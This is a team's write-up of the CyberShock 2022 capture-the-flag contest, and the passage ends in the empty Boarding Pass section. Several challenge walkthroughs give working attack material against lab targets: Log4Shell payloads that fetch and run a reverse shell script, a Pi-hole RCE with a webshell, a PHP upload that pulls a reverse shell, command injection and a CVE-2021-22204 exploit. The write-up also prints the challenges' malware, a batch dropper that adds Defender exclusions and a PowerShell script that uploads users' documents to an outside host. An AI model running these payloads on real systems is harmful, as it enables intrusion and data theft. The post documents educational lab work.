---
title: CyberShock CTF 2022 Write-Up
date: 09-10-2022
category: Write-Ups
tags: write-up,ctf,cybershock
---

![CyberShock 2022 banner](../../images/cybershock-2022-banner.png){: .image-process-crisp}

![CTF details](../../images/cybershoch-2022-ctf-details.png){: .image-process-crisp}

## Overview

CyberShock 2022 was a CTF hosted by [CybExer](https://cybexer.com/) &
[CTF Tech](https://www.ctftech.com/) along with [CyberChess](https://cyberchess.lv/)
conference, organized by [CERT.lv](https://cert.lv/lv/) on October 4th of 2022, where the
participation was remote.

Compared to the last year's performance, our team "TheGoodGuys" scored a lot higher,
from 13th to 6th out of 36 competitors, this was without losing any points (taking
hints, closing challenges).

We couldn't complete the last challenges (cryptography related):

![CTF mission board](../../images/cs2022-mission-board.png){: .image-process-crisp}

And you can see us here on the leaderboard:

![CTF leaderboard](../../images/cs2022-leaderboard.png){: .image-process-crisp}

At our level, there was close competition and if we hadn't completed a single challenge
we could have landed 9th or 10th, but in the last few minutes we completed the "Minecraft"
challenge (300pts) which boosted us to the 6th place.

![CTF leaderboard closer](../../images/cs2022-leaderboard-2.png){: .image-process-crisp}

Overall CTF had an interesting theme along with some defense/hardening tasks
which were checked by an automated script that I really liked, like adding a password on
an apache server and hardening an SSH server with pubkey authentication.

## Challenges

In total, there were 28 tasks split into 3 categories, "Smart Home",
"Smart City" and "Smart Airspace".

Rules:

- Only 5 challenges can be open at the same time.
- Closing a challenge reduces points.
- Taking hints reduces points.

The challenges were accessed by using remote kali virtual machines.

- [Kali In The Browser (Guacamole)](https://www.kali.org/docs/general-use/guacamole-kali-in-browser/)

**Note**: These challenges weren't completed alone by me, all of us in the team contributed in where we placed in the leader board and that's thanks to them.

### SMART HOME

#### NETWORK FIX

```md
Description
It has been an ordinary day for you, but suddenly all of the IoT devices in your home have stopped working due to your router resetting itself to default settings.
You cannot even enter your home as the smart door lock does not have connectivity.
Luckily the router is accessible from the WiFi.
Question
You remember that you had documented down the old routing table output.
Analyze it and find out which IP address must be configured as a gateway for the devices in network 10.5.7.0/24

r2# show ip route
Codes: K - kernel route, C - connected, S - static, R - RIP,
O - OSPF, I - IS-IS, B - BGP, E - EIGRP, N - NHRP,
T - Table, v - VNC, V - VNC-Direct, A - Babel, D - SHARP,
F - PBR, f - OpenFabric,

- selected route, *- FIB route, q - queued route, r - rejected route
B>* 0.0.0.0/0 [20/0] via 10.101.32.7, eth0, 09w4d08h
O 10.5.0.0/24 [110/10] is directly connected, eth1, 16w5d14h
C>*10.5.0.0/24 is directly connected, eth1, 16w5d14h
O>* 10.5.1.0/24 [110/20] via 10.5.0.4, eth1, 16w5d14h
O>*10.5.2.0/24 [110/20] via 10.5.0.4, eth1, 16w5d14h
O>* 10.5.3.0/24 [110/20] via 10.5.0.4, eth1, 16w5d14h
O>*10.5.4.0/22 [110/20] via 10.5.0.5, eth1, 16w5d14h
O>* 10.5.18.0/24 [110/20] via 10.5.0.1, eth1, 09w4d08h
O>*10.101.31.16/30 [110/5000] via 10.5.0.1, eth1, 09w4d08h
C>* 10.101.32.16/30 is directly connected, eth0, 16w5d14h
O>* 172.16.15.0/24 [110/20] via 10.5.0.10, eth1, 16w5d14h
```

##### Solution

A simple routing table analysis was done. Since 10.5.4.0/22 is the last IP address that falls into the range of 10.5.7.0/24 subnet, then our IP address will be the one specified after *via* - `10.5.0.5`. Enter it and get the flag.

#### IT'S ALWAYS DNS

```md
DESCRIPTION
After fixing the routing configuration, your smart door starts functioning again but something in the network is still not functioning as intended.
To be exact, pinging the IP addresses works, but names do not resolve.
QUESTION
Investigate your DNS server Pi-hole
and find a way to read the log file at /var/log/dnserror.log
Pi-Hole: <http://env263.target03/admin>
```

The first thing that I tried when visiting the login page
was the password "admin" and the guess was correct.

On the landing page, I checked what version of Pi-hole
was installed.

![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png){: .image-process-crisp}

The next obvious thing was to check if any vulnerability is present on that version in Exploit DB,
where this was found: <https://www.exploit-db.com/exploits/48519>

An authenticated RCE, perfect!

```bash
root@env263.kali05:/home/gt/its-always-dns# python3 48519.py 
[!] No arguments found: python3 CVE-2020-11108.py <dstIP> <srcIP> <PWD>
    Example: ./CVE-2020-11108.py 192.168.50.130 192.168.50.1 6DS4QtW5
    But for now, I will ask questions
[?] Please enter the IP address for Pi-Hole ([env263.target03]): 
[?] Please enter the your (reachable) IP address to launch listeners ([10.85.26.3]): 
[?] Please enter the password for Pi-Hole ([admin]): 
[+] Vulnerable URL is <http://env263.target03/admin>
[+] Creation success, ID is 6!
[!] Binding to 10.85.26.3:80
[+] Yes, we have an incoming connection from 10.93.26.3
[!] Closing Listener
[+] Update succeeded.
[+] This system is vulnerable!
Want to continue with exploitation? (Or just run cleanup)? [y/N]: y
Want root access? (Breaks the application!!) [y/N]: 
Ok, make sure to have a netcat listener on "10.85.26.3:9001" ("nc -lnvp 9001") and press enter to continue...
[!] Binding to 10.85.26.3:80
[+] Yes, we have an incoming connection from 10.93.26.3
[!] Closing Listener
[+] Update succeeded.
[+] Calling <http://env263.target03/admin/scripts/pi-hole/php/aotagnto.php>
[+] Calling exploit succeeded.
    
[+] Cleaning up now.
[+] Remove success
[+] All done, press enter to exit
```

Ok, cool. Where's the shell? Turns out it was a dud.

Multiple attempts were made, but non-succeeded, but
luckly after trying a custom payload to test the exploit, it was a success!

![Modified part of the RCE code](../../images/auth-rce-new-payload.png){: .image-process-crisp}

Exploit confirmed.

![RCE exploit confirmed](../../images/auth-rce-exploit-confirmed.png){: .image-process-crisp}

So where did I check it? It was here:

![Exploit location found](../../images/exploit-here.png){: .image-process-crisp}

Replacing the payload with a simple webshell

![New webshell payload](../../images/auth-rce-webshell-payload.png){: .image-process-crisp}

Exploit code output:

![New payload output](../../images/auth-rce-exploit-code-output.png){: .image-process-crisp}

And the flag was found by following this link: <http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log>

![Found flag](../../images/always-dns-flag.png){: .image-process-crisp}

#### COOL VIDEO

```md
DESCRIPTION
A friend asks for help with recent movie that was downloaded from torrents: something is wrong with player.
The video is available at <https://static.ctftech.io/challs/Horror_stories_2k21-720p.zip>
QUESTION
What is the address of C&C of the malware?
The answer is expected in usual format for an Internet address - <IP>:<PORT>
```

We though this was easy. And... it took a few hours. The solution
was a lucky guess based on the C&C (Command & Control) settings.

The bat script contained some magic, but nothing revealing was there.
But we used the certutil command to get to the solution

```bat
 @echo off
 CLS
 :init
 setlocal DisableDelayedExpansion
 set cmdInvoke=1
 set winSysFolder=System32
 set "batchPath=%~0"
 for %%k in (%0) do set batchName=%%~nk
 set "vbsGetPrivileges=%temp%\OEgetPriv_%batchName%.vbs"
 setlocal EnableDelayedExpansion
:checkPrivileges
  NET FILE 1>NUL 2>NUL
  if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
  if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)
  
  ECHO Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
  ECHO args = "ELEV " >> "%vbsGetPrivileges%"
  ECHO For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
  ECHO args = args ^& strArg ^& " "  >> "%vbsGetPrivileges%"
  ECHO Next >> "%vbsGetPrivileges%"

  if '%cmdInvoke%'=='1' goto InvokeCmd 

  ECHO UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%vbsGetPrivileges%"
  goto ExecElevation

:InvokeCmd
  ECHO args = "/c """ + "!batchPath!" + """ " + args >> "%vbsGetPrivileges%"
  ECHO UAC.ShellExecute "%SystemRoot%\%winSysFolder%\cmd.exe", args, "", "runas", 1 >> "%vbsGetPrivileges%"

:ExecElevation
 "%SystemRoot%\%winSysFolder%\WScript.exe" "%vbsGetPrivileges%" %*
 exit /B

:gotPrivileges
 setlocal & cd /d %~dp0
 if '%1'=='ELEV' (del "%vbsGetPrivileges%" 1>nul 2>nul  &  shift /1)

 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExt "exe"
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExt "srt"

 certutil -decodehex -f Subtitles.srt Subtitles_tmp.srt

 start Subtitles_tmp.srt
 cmd /k
 exit
```

We have this now, how do we run it?

```bat
certutil -decodehex -f Subtitles.srt Subtitles_tmp.srt
```

Obviously windows, but we're on Kali, so `wine` it is. To open a windows terminal in Kali, run `wine cmd`, this will enter a command promt, where it's possible to navigate to the local Kali files.

But, nothing interesting there that couldn't have been found in the `.msi` file.

We tried a bunch of lucky guesses, but got a small mistake in the IP.

Grepping the file again

![Grep contents](../../images/grep-results.png){: .image-process-crisp}

So the IP is 192.168.88.230, and if it's an encrypted communication channel, the the best guess for the port would be 443, that's if using HTTPS.

The guess was correct! The answer `192.168.88.230:443`.

#### STUCK

```md
DESCRIPTION
Earlier, while you were stuck outside your younger brother also tried to fix the network.
By following an online guide he managed to open a text file in a command-line application.
He now seems to be totally stuck in this program, but the deadline for his schoolwork is fast approaching.
QUESTION
Help your brother so he can get the schoolwork from
/home/billy/schoolwork

Billy's workstation can be accessed over SSH:
Hostname: env263.target03
Port: 2223
Username: billy
Password: fortnitepro123
```

##### Solution

After logging in via SSH, the current file had to be closed in the Vim editor (everyone loves Vim), then `flag.txt` was found in the `../schoolwork` path.

##### Steps

In the terminal execute `ssh billy@env263.target03 –p2223`.

![Vim editor](../../images/stuck-vim.png){: .image-process-crisp}

It was not as simple to exit with typing `:q!`, only by using the vim file explorer with command `:e .`
it was possible to afterwards exit `vim`.

Located the flag in `/home/billy/schoolwork` and used `nano` to view the contents of the file and found the flag: `ctftech{hardest-challenge}`.

#### FRIDGE

```md
DESCRIPTION
Your mom brings in the package, where you find a large amount of soda.
In the package there is also a letter.
The letter reads, that the smart fridge had sent out the order to restock itself.
You are certain that you have not ordered the products and neither has your family.
QUESTION
Access your smart fridge management console to investigate what is happening
Connect to: env263.target03
Port: 2333
The answer can be found in the /etc/apt/ folder
```

##### Solution

Solution here was to notice error when passing `|` character and after `|` character we can perform command
injection to find and reveal the flag.

##### Steps

1. Connect to the server using netcat `nc -nv 10.93.26.3 2333`.
2. After trying verious payloads we notice that when passing `|` an error is thrown: `Fridge is self-aware! Error: 0x0 dumping stack trace: ' .  . '`
3. Search for files in /etc/apt folder using the command inject we found `| ls -a /etc/apt` which leads us to the flag file `.flag.txt`.
4. Final payload `| cat /etc/apt/.flag.txt` gives us flag.
![Fridge payload](../../images/cybershock-2022-fridge.png){: .image-process-crisp}

#### MAILBOX

```md
DESCRIPTION
Once your brother managed to submit his homework, you get a notification that a package has been delivered to your smart mailbox.
You look outside the window and see your mother already opening the mailbox.
Out of the corner of your eye you notice a guy shoulder surfing while your mother is entering the PIN.
You decide to change the pin, but for this you need the admin pin code which you encrypted in a safe container when you initially got the mailbox.
Problem is that you don't remember the cipher you used for encryption.
QUESTION
You only remember the following details:
Tool: openssl
Password: Kh39.3e12kleZs-po7
Encrypted file
<https://static.ctftech.io/challs/pin.enc?_gl=1*1i0w9rs*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg5MjE3NC42LjEuMTY2NDg5MjI3OC4wLjAuMA>
```

**Solution:** Brute-force the decryption with algorithms listed for `openssl enc`. :)

The command for decrypting with a password is this `openssl enc -d -k Kh39.3e12kleZs-po7 -in pin.enc`, but it wasn't that simple, the default algorithm didn't work.

```bash
# With password
❯ openssl enc -d -k Kh39.3e12kleZs-po7 -in pin.enc 
Salted__eau>|D(@Qfi    %

# Without password
❯ openssl enc -d -in pin.enc          
Salted__eau>|D(@Qfi    %      
```

So after finding a proper way to decrypt this on the web, another attempt was made, yielding a different output than before

```bash
Desktop/cyber-shock-2022/mailbox 
❯ openssl enc -d -aes-256-cbc -in pin.enc -out pin -pbkdf2             
enter aes-256-cbc decryption password:
bad decrypt
139858126763840:error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length:crypto/evp/evp_enc.c:601:
```

Now we get some output. As little as I know crypto, I just went with trying everything on the block.

Used all algos from the `openssl enc -list` command and tried them
with the following bash one-liner.

```bash
for c in `openssl enc -list`; do openssl enc -d $c -k Kh39.3e12kleZs-po7 -in pin.enc -out "pin${c}" -pbkdf2 ;done
```

The flag was found!

![Mailbox flag found](../../images/mailbox-flag-found.png){: .image-process-crisp}

#### MINECRAFT

```md
DESCRIPTION
You have been hosting a Minecraft server for your friends for a long time.
All has been running smoothly and you have learned a lot in the process. Friends are happy as well 🙂
One day suddenly you read news about all kinds of vulnerabilities and how everything is insecure.
You start to wonder if your server is also affected.
QUESTION
Find the vulnerability from your system.
When you have found it, get the flag from /flag.

Minecraft server:
Hostname: env263.target02
Port: 25565
Server is running in offline mode.
```

So this was nerve wrecking and helped us jump from 9/10th place to 6th at the last minute of the comptetition.

**Solution**: Log4J is an obvious bug as it along with Minecraft are Java-based, but this was not the way to connect to it at
first.

Seemed like no way to connect to the server, couldn't get a client installed properly, so a decision to find a similar ctf challenge was made.

Found this: <https://ctftime.org/writeup/20489>, which in turn linked to this nice CLI tool <https://mccteam.github.io/>.

Having this installed, it was possible to connect to the server, not
exactly as simple as this at the start, couldn't get it to connect.

This was executed:

```bash
# After downloading the binary
<https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20221004-85>

apt install dotnet-runtime-6

# Run client
./MinecraftClient "" "" env263.target02:25565
```

But... "Connection has been lost."

![MCC connection lost](../../images/mcc-connection-lost.png){: .image-process-crisp}

So what was the problem? It needed a username. There was a lot of
struggle, but it was this simple.

None tried the exploit before and I was just as oblivious when attempting it, spent some good time mistyping jndi as jindi.

![Mistyped jndi](../../images/jndi-typo.png){: .image-process-crisp}

Once the `jndi` was properly typed, the response as handing and that's where we finally found that the exploit was possible.

The exploit that will be used is from David Bombal video, you can
find his repository here: <https://github.com/davidbombal/log4jminecraft>

Athough the default payload was not working because of special character issues, it was ran 2 times. Once to get the reverse shell on the machine and second to run the reverse shell.

First payload:

```java
public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("wget http://10.85.26.3:9001/rev.sh").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
```

Second payload:

```java
public class Log4jRCE {

    static {
        
        try {
            java.lang.Runtime.getRuntime().exec("bash rev.sh").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
```

Before triggering the payload a small setup was needed.

1. Run the java compile and exploit serve script.
2. Run the reverse shell http serve script.
3. Run the reverse shell listener
4. Run the Log4JRCE redirection script - used to redirect LDAP requests to exploit serve script to transfer and execute the payload on target machine.

After everything was setup, the following script was ran in the MC client to send the chat message

```bash
/send ${jndi:ldap://10.85.26.3:1389/Log4jRCE}
```

You will notice that the LDAP server is spammed, not sure what caused this, but had to kill the redirector just to not DoS the minecraft server.

![Send jndi message and LDAP server](../../images/ldap-redirect-server.png){: .image-process-crisp}

![HTTP servers and reverse shell listener](../../images/http-servers-running-with-listener.png){: .image-process-crisp}

And after running the second payload, we are in!

![Inside the minecraft server system](../../images/log4j-we-in.png){: .image-process-crisp}

#### INFECTION

```md
Your mother comes to you complaining that her work computer is sometimes acting weirdly.
She also has been getting emails about failed logins to her Admirals account. Luckily MFA stopped the logins.
QUESTION
You have reason to think that the computer is infected with malware.
If you can find the malware, analyze it to figure out how it works.

Mom's computer:
Hostname: env263.target04
Protocol: RDP
Username: Administrator
Password: Cool2Pass
```

##### Solution

Using windows event viewer, found a powershell log entry executing a base64 encoded command which lead to another base64 encrypted string that finally revealed the flag.

##### Steps

Logged in with command:

```bash
xfreerdp /v:env263.target04 /u:Administrator /p:Cool2Pass
```

And greeted with this nice picture of a chicken

![Chicken desktop](../../images/chicken.png){: .image-process-crisp}

Remembering what was mentioned in the description "Mother complaining", "failed logins", a good start would be to open "Internet Explorer" and check the history.

![Internet Explorer history](../../images/ie-history.png){: .image-process-crisp}

Surely there's the Admin's page, so we're on the right browser and
the history contains some peculiar entries, but not so useful.

Ok, where could we check malware activity? Processes? Logs?

In the process monitor, powershell showed it's head from time to time, taking this hint, we're moving to logs.

![Windows event viewer, powershell log entry highlighted](../../images/infected-windows-logs.png){: .image-process-crisp}

As we can see, there are a lot of frequent entries and a huge base64
payload that reeks of malware.

Now we open up CyberChef and analyze.

![CyberChef decoded first payload](../../images/cyber-chef-decode.png){: .image-process-crisp}

Lots of spaces, but got rid of it with search and replace. So we're looking at this, and at the bottom we see that the base64 from variable `$e` is decoded and stored in `$s` which is lastly passed to some gzip compression function.

![Cleaned up first payload](../../images/cleaned-decoded-first-payload.png){: .image-process-crisp}

Now we can do the same in CyberChef. First using "From Base64" and then "Gunzip".

![Decoding the second payload with base64 and gunzip](../../images/base64-gunzip-cs2022.png){: .image-process-crisp}

```powershell
$uri="http://check.ctf/upload"
try {
$ErrorActionPreference = "SilentlyContinue"
$f="ZmxhZyBpcyA4MTY4MTc3NS0yYTE0LTQ2MzktOGQyNC01MjYyZTUyMTI2N2Y="
foreach ($user in $(Get-ChildItem -path "C:\Users").FullName) {
$files=(Get-ChildItem -recurse -path "$user\Documents").FullName
foreach ($file in $files) {
$x = Get-Item -Path $file
$fname = (Get-ChildItem $file).Name
$fileBytes = [System.IO.File]::ReadAllBytes($x);
$fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes);
$boundary = [System.Guid]::NewGuid().ToString(); 
$LF = "`r`n";
$bodyLines = (
"--$boundary",
"Content-Disposition: form-data; name=`"upload`"$LF",
"true$LF",
"--$boundary",
"Content-Disposition: form-data; name=`"file`"; filename=`"$fname`"",
"Content-Type: application/octet-stream$LF",
$fileEnc,
"--$boundary--$LF" 
) -join $LF
Invoke-RestMethod -Uri $Uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null
}
}
$ErrorActionPreference = "Continue"
}
catch {
$ErrorActionPreference = "Continue"
Write-Error "error"
}
Remove-Item .\update.cmd -Force -ErrorAction SilentlyContinue
```

This looks like the correct path and we can finally find the flag decrypting another base64 string.

```bash
❯ echo -n "ZmxhZyBpcyA4MTY4MTc3NS0yYTE0LTQ2MzktOGQyNC01MjYyZTUyMTI2N2Y=" | base64 -d
flag is 81681775-2a14-4639-8d24-5262e521267f
```

#### HOMEWORK (UNSOLVED by us)

```md
DESCRIPTION
Help your brother Billy with his homework.
He has been complaining that it is too difficult.
QUESTION
Solve the homework to reveal the answer in flag.txt
Homework
```

For this we tried to use ghidra to decompile the code and reverse the program, but due to lack of knowledge we failed. We found a [similar CTF](https://jorianwoltjer.com/blog/post/ctf/nahamcon-ctf-2022/babyrev), but it
didn't help much.

- Solution: https://arthepsy.eu/ctf/cybershock2022/smart-home.homework.html

#### EMOJI ANALYSIS (UNSOLVED by us)

```md
DESCRIPTION
You find a strange note from your backpack.
PS! There is also a post-it-note on the backside of the paper where are written the following numbers 32 54 80 46 155.
QUESTION
Figure out what the note means and find the flag.
strange note: <https://static.ctftech.io/challs/encoded_story.html?_gl=1*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.>
```

The solution for this was the analysis of the frequency of the emojies correlating to the english language and
replacing the emojies to characters, but we couldn't figure it out in the CTF.

- Solution: https://arthepsy.eu/ctf/cybershock2022/smart-home.emoji-analysis.html

### SMART CITY

#### HEALTH CHECK

```md
DESCRIPTION
The city has set up a website to test the availability of different services.
The admins are seeing icmp request from the application to internal networks.
This is really strange as it should be able to ping only public IP addresses.
QUESTION
Help them to figure out what is going on.
They have assigned you an internal IP address of 172.20.10.2 to make the ping requests against from the application.
<http://env263.target03:1343/>
```

##### Solution 

Since entering in a regular IPv4 format address returned *"Not a public IP address"&* output, a workaround was needed for this task. This IPv4 address was converted to a decimal numeral system, after which entered in integer returned a flag.

##### Steps

1. Go to <https://dnschecker.org/ip-to-decimal.php> and convert `172.20.10.2` IP address to decimal numeral system.
2. The desired output is an integer number: `2886994434`, which bypasses IP address filtering.
3. And the flag was found.

![Automated flag](../../images/health-check-flag.png){: .image-process-crisp}

#### HARDEN

```md
DESCRIPTION
During regular systems audits, it was discovered that one of the DEV jumphosts does not meet the security baseline.
Therefore this system must be hardened.
TASK
Harden the SSH configuration so that it meets the baseline.
- Make sure that root login is disabled
- disable password authentication
Add this public key so that the user: sysadmin is able to log in with their private key

SSH access:
Hostname: env263.target02
Port: 2224
Username: sysadmin
Password: Cool2Pass
```

##### Solution

Solution here was to harden ssh authentication, disabling root login and password login for this server instead
adding public key authentication.

The solution was validated by an automated bash script in the CTF platform.

##### Steps

1. SSH into server `ssh -i id_rsa sysadmin@env263.target02 -p 2224`
2. `nano /etc/ssh/sshd_config` and add the following contents at the end of the file

```
PasswordAuthentication no
UsePAM no
PermitRootLogin no
PermitRootLogin prohibit-password
```

3. Restart server `/etc/init.d/ssh reload`
4. Add public key into `~/.ssh/authorized_keys`.

```bash
mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
nano .ssh/authorized_keys 
```

5. Then we made sure that we can't login as root and with password. Finally we submitted the task for assessment and it succeeded.

#### NEXIF

```md
DESCRIPTION
Test the security of this online ExifTool service.
QUESTION
Can you find the vulnerability and exploit it?
You can find the flag from the home folder.
<http://env263.target02:8082/>
```

##### Solution

Quick google search reveals to us that ExifTool is a free and open-source software program for reading, writing, and manipulating image, audio, video, and PDF metadata. By researching futher it was found out that for this ExifTool a widely known `CVE-2021-22204 Arbitraty Code Execution` can be used to gain access to the flag.

##### Steps

1. Google search the exploit: <https://github.com/UNICORDev/exploit-CVE-2021-22204>, download it by using `git` commands.
2. Launch a `netcat` utility reverse shell listener on `9001` port: `nc -lvnp 9001`
3. Launch a CVE exploit and specify IP address through `-s` flag: `python3 exploit-CVE-2021-22204.py -s 10.X.Y.Z 9001` (here the real IPv4 address is hidden on purpose).
4. Upload any file to the ExifTool service.
5. Shell exploit works - by looking inside `/home` folder a suspicious `/user1337` folder is found - inside it a `flag.txt` file can be seen. Retrieved flag from the file.

#### SMART BIKE

```md
After making it to the council you speak with the local IT administrators.
They are impressed with your skills and want your help in a security audit.
An exposed API endpoint could be exposing some sensitive information on the city's new Smart Bike infrastructure.
Can you take a look and see if there are any security issues that can be fixed?
QUESTION
Find a way to abuse the functionality of an exposed API endpoint and retrieve the flag from /var/flag.txt
The only thing we know is the exposed IP address.
```

##### Solution

By scanning <http://envXYZ.target03:8000/> with gobuster, `robots.txt` was found which led to `/js/config.js`
containing the API key to the API which was vulnerable to LFI using the `file` parameter.

##### Steps

Access <http://envXYZ.target03:8000/> and scan directories using [gobuster](https://github.com/OJ/gobuster)
with the `common.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists)

```bash
gobuster dir -u URL -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Looking at the scan results, `robots.txt` file found which contained the following info:

![Robots file](../../images/smart-bike-robots.png){: .image-process-crisp}

Visiting `/js/config.js` in the browser, revealed `/upl` endpoint that is used to store files uploaded
by using the "create" method by the API and along with that the API key.

![Config file](../../images/smart-bike-api.png){: .image-process-crisp}

Create a reverse shell listener on `9002` port to listen for connections: `nc -lvnp 9002`.

Prepare a PHP reverse shell with name `rev.php` and run an HTTP server for downloading it later.

- Payload used: <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>
  - Needs IP and PORT changed.

```bash
# Download payload
# - edit the CHANGEME's
curl https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O rev.php

# Run the HTTP web server.
python3 -m http.server 9002
```

Now to exploit the API. Do a POST request with the apiKey value from `config.js` file to the `/api` endpoint.

```bash
curl -X POST -d "apiKey=37e4950e-d638-4e9f-9fe1-56baac1b85f2&method=create&filename=create_rev.php&content=<?php passthru('wget 10.X.Y.Z:9002/rev.php'); ?>" http://envXYZ.target03:8000/api/
```

Trigger reverse shell by visiting `/upl/create_rev.php` which executes the PHP code in the `create_rev.php` file.
Our payload should be found afterwards and triggered by visiting `/upl/rev.php`.

If everything was done correctly, the listener should have a new connection established to the target machine.
Finally `cat` out the flag from `/var/flag.txt`.

#### SELF-DRIVING-CAR

```md
DESCRIPTION
For your efforts, the city council has decided to award you with a free flight to a holiday destination.
Just as you have finished packing you get another call.
A company building self-driving cars has been experiencing an odd after-effect from the recent attacks against the city.
The city council has forwarded the company representative to you and after discussing the details you find out that they had a city guide application API integrated into their self-driving cars.
QUESTION
The company has provided you with SSH credentials and information that they use Robot Operating System for their self-driving cars.
You must find the status message of the active instance and help debugging the vehicle.
SSH:
Hostname: env263.target03
Port: 2222
Username: jack
Password: autonomous1337vehicles
```

##### Solution

Solution here was to look for active running processes and one of processes contained flag, but this may have not been the intended path.

##### Steps

1. SSH into server `ssh jack@env263.target03 -p2222`
2. `ps aux` shows interesting running processes.
   ![ps aux results](../../images/cybershock-2022-self-driving-car-1.png){: .image-process-crisp}
3. `cd` into folder and `cat autonomous_shuttle_statushandler.py` gives us flag.
   ![content of autonomous_shuttle_statushandler.py](../../images/cybershock-2022-self-driving-car-2.png){: .image-process-crisp}

#### BUS STOP

```md
DESCRIPTION
Your help is also needed for another task.
The previous developer for the bus stop digital signage servers has disappeared into thin air, but information still needs to be updated throughout the city.
QUESTION
You have been asked to help.
Find out if there is some vulnerability, backdoor, misconfiguration, etc. that would allow you to access the system.
Digital Signage Management Interface
Flag will be given when correct login credentials are used.

<http://env263.target03:8888/>
```

##### Solution

No particular solution whatsoever due to the challenge not working properly. When visiting the challenge site, the
flag was all over the page. :)

##### Steps

To get the flag, simply open webpage and the flag is there.

#### MAPS

```md
You manage to trace the origin of the malware back to the city guide website.
You attempt to report your findings to the city council, but all of the phone lines are down.
You decide to take matters into your own hands.
QUESTION
Find a vulnerability in the city guide application and for POC, read the flag from /var/flag.txt

<http://env263.target03:8111/>
```

##### Solution

Solution here was to upload PHP file, get RCE and read /var/flag.txt content

##### Steps

1. Notice in HTML content the commented out endpoint `<!-- <a href="/smartupload">Update logo</> //disabled no need for logo update -->`
2. In /smartupload we where able to upload files but where do the go?
3. After fuzzing with `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed the `/smartupload/uploads` folder.
4. After opening BURP and modifying the POST request contents we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
   ![Burp payload for php shell](../../images/cybershock-2022-maps.png){: .image-process-crisp}
5. As we already know that files go into `/smartupload/uploads` path we go into our url <http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt> and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`.

#### REGISTRY (UNSOLVED by us)

```md
DESCRIPTION
Now you must be a master of Windows registry. Set of files were recovered from backup of a Windows machine.
They are at <https://static.ctftech.io/challs/registry.tar.xz>.
You have to dig deep into the files and prove that you can process every piece of data that is in there.
The files can be broken or incomplete, but this just adds fun for a proper forensic engineer, right?
QUESTION
What is SHA-256 hash of the registry cell that contains value of HKLM\SYSTEM\ControlSet001\Control\Lsa\LimitBlankPasswordUse?
Submit the answer in hex-printed from, lower-case letters, without any separators.
```

The solution was actually close to what we were trying, but due to not reading the spec enough, it was not enough.
In order to repair the registry hive you had to understand the structure of an entry to read it.

- Solution: https://arthepsy.eu/ctf/cybershock2022/smart-city.registry.html

#### ONE TIME PAD (UNSOLVED by us)

```md
DESCRIPTION
SOC has managed to acquire two encrypted messages and a plain text message, that corresponds to one of the encrypted messages.
QUESTION
Identify the encryption key and recover the other plaintext.
Get the files from HERE
<https://static.ctftech.io/challs/captured_files.zip?_gl=1*1t9e0jc*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.>
```

Similarly to the previous one's crypto wasn't our favorite.

- Solution: https://arthepsy.eu/ctf/cybershock2022/smart-city.one-time-pad.html

#### SMART AIRSPACE

#### AUTOMATED

```md
Description
You find a paper with the following details:

Join CTF-Tech Discord.
Find Bot.
Write !minictf to the bot's DMs.

Good luck.
Question
Here is the invite to the server <https://discord.com/invite/cboe>
```

##### Solution

Using the CTF discord invite link a CTF Tech Bot was visible as one of the first users on the server - by providing answers to the bot's questions the flag was successfully acquired.

##### Steps

After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:

![Command output](../../images/automated-minictf.png){: .image-process-crisp}

Correct answer is 00100000 (converting 32 from decimal to binary).

After that the following question was provided:

![Linux answer](../../images/automated-linux.png){: .image-process-crisp}

It is widely known that Linux is beneficial due to excellent performance rates and stability.

After that a flag was provided to the team with ease:

![Automated flag](../../images/automated-flag.png){: .image-process-crisp}

#### BOARDING PASS

```md
DESCRIPTION
After fixing the problems you want to finally complete your check-in, but all the airport systems still haven't recovered from the attacks.
The airline is unable to generate you a valid boarding pass.
Security is tight and they don't allow you into the security area if you don't pass the gates.
QUESTION
You get a brilliant idea. You still have an old ticket from your previous flight in your bag.
Maybe you can change some fields and gain access using this method?

New flight information:
Booking reference(PNR): CTF123
From: Tartu Airport
To: Sydney Airport
Airline: Nordica
Flight number: 0777
Ticket format: E-ticket
Change only these values!

Submit the new barcode data as an answer.
```

##### Solution

Solution here was to understand structure of bar code given in boarding pass and modify it's content.

##### Steps

